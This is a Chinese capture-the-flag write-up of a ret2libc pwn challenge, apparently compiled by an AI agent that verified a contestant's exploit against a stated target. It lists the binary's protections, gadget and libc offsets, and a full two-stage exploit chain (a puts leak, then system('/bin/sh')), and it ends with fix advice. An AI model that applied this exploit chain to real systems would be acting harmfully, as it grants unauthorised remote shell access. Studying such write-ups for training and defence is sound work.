# ret2libc · 渗透记录

> **脚本来源**：本题 exploit 脚本由参赛者本人手搓提供，Agent 负责在目标环境复现、验证、排错与题解/记录整理。


## 2.1 基本信息
| 字段 | 内容 |
|---|---|
| 题目 | ret2libc |
| 类型 | Pwn / 栈溢出 ret2libc（puts 泄露 + 二次溢出） |
| 入口 | 219.216.64.241:35194（附件：attachments/pwn + libc.so.6 + ld-linux） |
| 耗时 | 0 日 0 时 2 分 0 秒 |
| LLM | deepseek-flash |
| flag | `nex{Re7zI1GC_wzjwsxbi}` |

## 2.2 目标与授权
- 授权范围：仅用户给定的 219.216.64.241:35194；少量连接，只读 flag，未在靶机留文件
- 禁止动作：DoS、横向移动、持久化、读取无关数据

## 2.3 侦察与指纹
ELF64 amd64，非 PIE（基址 0x3fe000），Partial RELRO + NX + 无 canary，未 strip；vuln@0x40116f（push rbp; sub rsp,0x40 -> 偏移 72）；pop rdi;ret@0x40116a、ret@0x40101a、puts@plt=0x401030、puts@got=0x404000；libc: puts=0x8e860、system=0x5c2e0、"/bin/sh"=0x1db799

## 2.4 攻击面
TCP 交互程序：banner `=== libc roulette ===\nshow me what you got\n> `，vuln 里 read 入 0x40 栈缓冲区无长度校验 -> 覆盖 saved RIP；可重复进入 vuln 做两阶段

## 2.5 漏洞判定
- 类型：Pwn / 栈溢出 ret2libc（puts 泄露 + 二次溢出）
- 位置：vuln 栈缓冲区溢出（0x40116f，偏移 72）
- 证据：evidence/step1_*、step2_*（两次连接泄露不同：0x14fce2ee8860 / 0x14b66de59860，分别算出页对齐 base，stage1/stage2 载荷留档，shell 回显同一 flag + id=ctf）
- 误报排除：两次不同泄露独立算 base 均页对齐且成功，排除固定地址；不加 ret 对齐时 shell 无回显（system 的 movaps 崩），加后稳定；puts 泄露是 6 字节地址 + 换行（高位 0x00 被 puts 截断），用 recvline + ljust(8) 解析，不是把 GOT 值当字符串读错

## 2.6 利用链
```
connect -> banner `> `
stage1 = 72*A + pop_rdi(0x40116a) + puts@got(0x404000) + puts@plt(0x401030) + vuln(0x40116f)
recvline -> 6 字节 puts 运行时地址 -> puts_addr = u64(leak.ljust(8,b'\0'))
base = puts_addr - libc.puts(0x8e860)
system = base + 0x5c2e0 ; binsh = base + 0x1db799
stage2 = 72*A + pop_rdi + binsh + ret(0x40101a) + system
sendline -> system('/bin/sh') -> cat ./flag -> nex{Re7zI1GC_wzjwsxbi}
```

## 2.7 影响
远程代码执行（uid=ctf），读取 /home/ctf/flag；flag 文件权限 r--r--r--

## 2.8 修复建议
read/gets 限制长度并校验；开 canary（-fstack-protector-all）；不要泄露 libc 地址（注意 puts 截断高位仍泄露 6 字节 ASLR）；保留 NX/PIE/Full RELRO

## 2.9 复盘
两阶段：先 puts 泄露算 base，再 system('/bin/sh')；第二次进 vuln 不再打印 '> '，别 recvuntil，直接发 stage2。
